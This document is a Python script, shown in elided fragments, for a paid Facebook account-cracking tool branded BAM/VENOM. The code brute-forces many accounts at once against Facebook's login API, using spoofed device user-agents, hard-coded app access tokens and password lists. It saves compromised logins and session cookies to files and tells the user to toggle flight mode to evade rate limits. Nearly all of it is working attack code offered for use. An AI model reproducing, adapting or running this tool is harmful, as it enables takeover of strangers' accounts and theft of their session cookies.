...
ua = "[FB4A/;FBAV/;FBBV/473623546;FBAN/FB4A;FBAV/;FBBV/473623546;FBDM//*{density=3.0,width=1440,height=1280};FBLC/en_US;FBRV/262678252;FBCR/TECNO;FBMF/Apple;FBBD/Medion;FBPN/com.facebook.katana;FBDV/Realme_X15;FBSV/15;FBOP/5;FBCA/armeabi;FBSS/;]','[FB4A/;FBAV/YZWSES93;FBBV/148189194;FBAN/FB4A;FBAV/YZWSES93;FBBV/148189194;FBDM//*{density=2.5,width=1080,height=1920};FBLC/zh_CN;FBRV/188711163;FBCR/Sony;FBMF/Motorola;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Realme_X17;FBSV/17;FBOP/4;FBCA/x86;FBSS/18;]"
folder_path = '/sdcard/BAM'
try:
...
⠀  ⠀⠀⠀⠀⠀⠙⢿⡄⢿⣿⣿⣿⣿⣿⣎⠙⠻⠛⣁⣼⣿⣿⡿⠛⠁⡸⠀⠀⠀
  ...
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠉
════════════════════════════════════════════════
\033[1;32m  • \033[1;37m Tool Owner :-  Khalil 
\033[1;32m  • \033[1;37m GitHub     :-  ZERO_69
\033[1;32m  • \033[1;37m Type       :-  Paid
\033[1;32m  • \033[1;37m Version    :-{version}""")
os.system('clear')
#print("\033[1;32m [•]\033[1;37m Join My FaceBook Group...! \033[1;32mThnx");time.sleep(2);os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
...
def Main_VENOM():
        ...
        if opt1 == "1": method()
            ...
            d=input(' [•] Choose : ')
            if d == '1':os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi');Main_VENOM()
            if d == '2':os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi');Main_VENOM()
...
def method():
    clear();print("\033[1;32m [•]\033[1;37m For Example : \033[1;32m/sdcard/BAM.txt");line()
    ...
    with tred(max_workers=30) as VENOM:
        ...
        print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/BAM');line()
        #line()
        for user in fo:
    ...
    p(" \033[1;32m[•] \033[1;37mCloning Accounts Saved in\033[1;32m /sdcard/BAM")
...
def pak():
               ...
               # if (c).lower() == "y":user_opt.append("c")
                ...
                with tred(max_workers=30) as VENOM:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/BAM');line()
                        for psx in user:
                                ids = code+psx
                ...
                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/BAM/BAM-S-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/BAM/BAM-S-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python BAM.py')
...
def gmail():
                ...
                with tred(max_workers=30) as VENOM:
                        ...
                        clear()
                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+total);print('\033[1;32m (√) \033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/BAM');line()
                        for user in fo:
                                ids,names = user.split('|')
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\33[1;37m [\33[1;32mBAM-S\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                xxx = "[FBAN/;FBAV/4Q095MQG;FBBV/427969893;FBAN/FBAN;FBAV/4Q095MQG;FBBV/427969893;FBDM//*{density=1.5,width=720,height=4096};FBLC/de_DE;FBRV/635659309;FBCR/TECNO;FBMF/OnePlus;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_9;FBSV/11;FBOP/4;FBCA/arm64-v8a;FBSS/;]','[FBAN/;FBAV/4Q095MQG;FBBV/343625699;FBAN/FBAN;FBAV/4Q095MQG;FBBV/343625699;FBDM//*{density=3.0,width=1080,height=3840};FBLC/fr_FR;FBRV/971509585;FBCR/Realme;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Redmi_10;FBSV/11;FBOP/7;FBCA/x86;FBSS/11;]','[FBAN/;FBAV/;FBBV/406924505;FBAN/FBAN;FBAV/;FBBV/406924505;FBDM//*{density=2.0,width=1440,height=4096};FBLC/en_US;FBRV/897964205;FBCR/LG;FBMF/Motorola;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_12;FBSV/17;FBOP/4;FBCA/armeabi;FBSS/;]"
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FB4A/;FBAV/YZWSES93;FBBV/894905261;FBAN/FB4A;FBAV/YZWSES93;FBBV/894905261;FBDM//*{density=2.5,width=1080,height=2560};FBLC/es_ES;FBRV/652864194;FBCR/Nokia;FBMF/Apple;FBBD/HMD_Global;FBPN/com.facebook.katana;FBDV/iPhone13,1;FBSV/13;FBOP/4;FBCA/arm64-v8a;FBSS/18;]"
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FB4A/;FBAV/A1XDL5U4;FBBV/174951073;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/174951073;FBDM//*{density=2.0,width=720,height=3840};FBLC/de_DE;FBRV/157633409;FBCR/OPPO;FBMF/Motorola;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/HTC_Drive_15;FBSV/13;FBOP/5;FBCA/x86_64;FBSS/;]"
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [BAM-OK] '+uid+' √ '+pas)
                        print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
                        file_path_ok = os.path.join(folder_path, 'BAM-R-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'BAM-S-COOKIE.txt')
                        ...
                        file_path = os.path.join(folder_path, 'BAM-R-CP.txt')
...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
            network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
            xxx = "[FB4A/;FBAV/4Q095MQG;FBBV/775147463;FBAN/FB4A;FBAV/4Q095MQG;FBBV/775147463;FBDM//*{density=3.0,width=720,height=4096};FBLC/it_IT;FBRV/252834271;FBCR/LG;FBMF/Xiaomi;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12ZA;FBSV/17;FBOP/8;FBCA/arm64-v8a;FBSS/18;]','[FBAN/;FBAV/;FBBV/918930156;FBAN/FBAN;FBAV/;FBBV/918930156;FBDM//*{density=1.5,width=720,height=4096};FBLC/ru_RU;FBRV/218032686;FBCR/Nokia;FBMF/VIVO;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A52;FBSV/13;FBOP/8;FBCA/armeabi-v7a;FBSS/;]"
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/;FBAV/A1XDL5U4;FBBV/541077407;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/541077407;FBDM//*{density=1.5,width=1080,height=4096};FBLC/ru_RU;FBRV/895815822;FBCR/LG;FBMF/Motorola;FBBD/Palm;FBPN/com.facebook.katana;FBDV/Mi_11T_Pro;FBSV/14;FBOP/8;FBCA/x86_64;FBSS/;]"
            head = {'User-Agent':VENOM_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            ...
            if 'session_key' in po:
                    ...
                    print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
                    file_path = os.path.join(folder_path, 'BAM-FILE-OK.txt')
                    ...
                    open('/sdcard/BAM/BAM-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\33[1m\33[1;35m [BAM-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'BAM-FILE-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    cps.append(uid)
                    break
...
def main_apv():
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20BAM%20Owner%20BAM-S%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213771372932?text='+tks)
        main_apv() 
main_apv()